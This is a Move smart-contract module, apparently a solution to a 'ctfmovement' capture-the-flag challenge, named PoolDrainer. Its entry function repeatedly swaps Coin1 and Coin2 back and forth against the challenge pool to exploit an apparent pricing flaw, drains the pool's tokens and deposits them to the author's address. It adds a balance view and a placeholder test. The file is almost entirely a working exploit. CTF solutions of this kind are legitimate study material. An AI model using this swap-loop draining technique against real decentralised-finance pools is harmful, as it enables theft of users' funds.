module atac::PoolDrainer {
    use std::signer;

    use aptos_framework::coin;

    use ctfmovement::pool::{Coin1, Coin2, Self};

    entry fun swap(owner: &signer) {
        // only me
        assert!( signer::address_of(owner) == @atac, 0);
        // get first coin
        let balance1 = 5;
        let coin1 = coin::withdraw<Coin1>(owner, balance1);
        let coin2 = coin::withdraw<Coin2>(owner, balance1);
        let new_coin2 = pool::swap_12(&mut coin1, balance1);
        coin::merge<Coin2>(&mut coin2, new_coin2);

        let value1: u64;
        let value2 = 10;
        loop  {
            coin::merge<Coin1>(&mut coin1, pool::swap_21(&mut coin2, value2));
            value1 = coin::value<Coin1>(&coin1);
            coin::merge<Coin2>(&mut coin2, pool::swap_12(&mut coin1, value1));
            value2 = coin::value<Coin2>(&coin2);
            if (value2 > 24) {
                coin::merge<Coin1>(&mut coin1, pool::swap_21(&mut coin2, 24));
                break
            }
        };
    
        coin::deposit<Coin1>(@atac, coin1);
        coin::deposit<Coin2>(@atac, coin2);

    }


    #[view]
    public fun balances(): (u64, u64) {
        let bal1 = coin::balance<Coin1>(@atac);
        let bal2 = coin::balance<Coin2>(@atac);

        (bal1, bal2)
    }


    #[test]
    fun test_smoke() {
        assert!(true, 777);
    }

}